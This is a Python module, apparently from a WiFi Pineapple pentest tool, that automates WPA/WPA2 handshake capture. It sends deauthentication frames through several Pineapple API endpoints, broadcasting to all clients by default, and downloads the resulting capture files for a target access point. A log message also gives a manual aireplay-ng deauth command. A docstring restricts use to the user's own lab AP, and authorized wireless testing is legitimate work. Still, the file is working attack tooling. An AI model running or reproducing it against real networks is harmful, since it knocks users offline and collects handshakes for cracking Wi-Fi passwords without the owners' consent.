"""
handshake.py
------------
WPA handshake capture module.

Workflow:
  1. Record handshakes already on device (before snapshot)
  2. Attempt deauth to trigger a new reconnect/handshake
     - If the API deauth endpoint works, use it
     - If it 404s, log a warning and fall back to SSH deauth or manual
  3. Wait for new captures to appear
  4. Download new captures (or all captures matching target BSSID if --download-all)
  5. Return metadata for the report

IMPORTANT: Only use against your own authorized lab AP.
"""

import time
import os
import subprocess
from modules.base_module import BaseModule
from core.api_client import PineappleClient, PineappleAPIError


class HandshakeModule(BaseModule):
    """
    Manages WPA/WPA2 handshake capture via the Pineapple.

    Args:
        client:        PineappleClient instance.
        target_bssid:  MAC of the target AP (your lab AP).
        client_mac:    Client to deauth. FF:FF:FF:FF:FF:FF = broadcast.
        capture_dir:   Local directory to save downloaded .cap files.
        poll_wait:     Seconds to wait for handshake after deauth.
        download_all:  If True, also download pre-existing captures
                       that match target_bssid. Useful when deauth
                       is unavailable via API.
        log_dir:       Directory for log output.
    """

    def __init__(
        self,
        client: PineappleClient,
        target_bssid: str,
        client_mac:   str  = "FF:FF:FF:FF:FF:FF",
        capture_dir:  str  = "./captures",
        poll_wait:    int  = 20,
        download_all: bool = False,
        log_dir:      str  = "./logs",
    ):
        super().__init__(client, log_dir)
        self.target_bssid = target_bssid.lower()
        self.client_mac   = client_mac
        self.capture_dir  = capture_dir
        self.poll_wait    = poll_wait
        self.download_all = download_all
        os.makedirs(capture_dir, exist_ok=True)

    def _normalize_bssid(self, bssid: str) -> str:
        """Lowercase and strip for consistent comparison."""
        return (bssid or "").lower().strip()

    def run(self):
        self.logger.info(f"HandshakeModule targeting BSSID={self.target_bssid}")

        # ── Step 1: Snapshot existing handshakes ─────────────────────
        existing = self.client.get_handshakes()
        existing_filenames = {h["filename"] for h in existing}
        self.logger.info(
            f"{len(existing_filenames)} handshake(s) already on device before deauth"
        )

        # ── Step 2: Attempt deauth ────────────────────────────────────
        deauth_succeeded = self._attempt_deauth()

        if not deauth_succeeded:
            self.logger.warning(
                "Deauth via API failed. "
                "You can manually deauth from the Pineapple web UI → PineAP → Deauth, "
                "or via SSH: aireplay-ng --deauth 5 -a <BSSID> wlan1mon"
            )

        # ── Step 3: Wait for new capture ─────────────────────────────
        self.logger.info(f"Waiting {self.poll_wait}s for handshake capture...")
        time.sleep(self.poll_wait)

        # ── Step 4: Get updated handshake list ────────────────────────
        after = self.client.get_handshakes()
        new_captures = [
            h for h in after
            if h["filename"] not in existing_filenames
        ]
        self.logger.info(f"{len(new_captures)} new capture(s) appeared after deauth")

        # ── Step 5: If no new captures, optionally grab existing ones
        #            that match the target BSSID ────────────────────────
        if not new_captures and self.download_all:
            self.logger.info(
                f"No new captures — looking for existing captures "
                f"matching BSSID {self.target_bssid}"
            )
            new_captures = [
                h for h in after
                if self._normalize_bssid(h.get("bssid", "")) == self.target_bssid
            ]
            if new_captures:
                self.logger.info(
                    f"Found {len(new_captures)} existing capture(s) matching target BSSID"
                )
            else:
                self.logger.info(
                    "No existing captures match target BSSID either. "
                    "Try running the Pineapple web UI handshake capture manually first."
                )

        # ── Step 6: Download captures ─────────────────────────────────
        downloaded = []
        for h in new_captures:
            fname      = h["filename"]
            local_path = os.path.join(self.capture_dir, fname)

            # Skip if already downloaded
            if os.path.exists(local_path):
                self.logger.info(f"Already downloaded: {fname} — skipping")
                downloaded.append({
                    "filename":   fname,
                    "local_path": local_path,
                    "bssid":      h.get("bssid", self.target_bssid),
                    "ssid":       h.get("ssid", "unknown"),
                    "timestamp":  h.get("timestamp", ""),
                })
                continue

            try:
                self.client.download_handshake(fname, local_path)
                downloaded.append({
                    "filename":   fname,
                    "local_path": local_path,
                    "bssid":      h.get("bssid", self.target_bssid),
                    "ssid":       h.get("ssid", "unknown"),
                    "timestamp":  h.get("timestamp", ""),
                })
                self.logger.info(f"Downloaded: {fname}")
            except PineappleAPIError as e:
                self.logger.error(f"Failed to download {fname}: {e}")

        self.results = {"captures": downloaded}
        self.logger.info(
            f"HandshakeModule complete — {len(downloaded)} capture(s) downloaded."
        )

    def _attempt_deauth(self) -> bool:
        """
        Try to send deauth frames via the Pineapple API.
        Returns True if deauth was sent, False if all methods failed.

        Tries multiple endpoint patterns since the exact endpoint
        varies across firmware versions.
        """
        deauth_endpoints = [
            # Format: (endpoint, payload_builder)
            ("pineap/deauth",            {"bssid": self.target_bssid, "client": self.client_mac}),
            ("pineap/handshakes/deauth", {"bssid": self.target_bssid, "client": self.client_mac}),
            ("pineap/handshake/deauth",  {"bssid": self.target_bssid, "client": self.client_mac}),
        ]

        for endpoint, payload in deauth_endpoints:
            try:
                self.logger.info(f"Trying deauth via POST {endpoint}")
                self.client._post(endpoint, payload)
                self.logger.info(f"Deauth sent via {endpoint}")
                return True
            except PineappleAPIError as e:
                self.logger.debug(f"  → {endpoint} failed: {e}")
                continue

        return False

    def get_results(self) -> dict:
        return self.results

    def summary(self) -> str:
        n = len(self.results.get("captures", []))
        return f"HandshakeModule: {n} handshake capture(s) downloaded"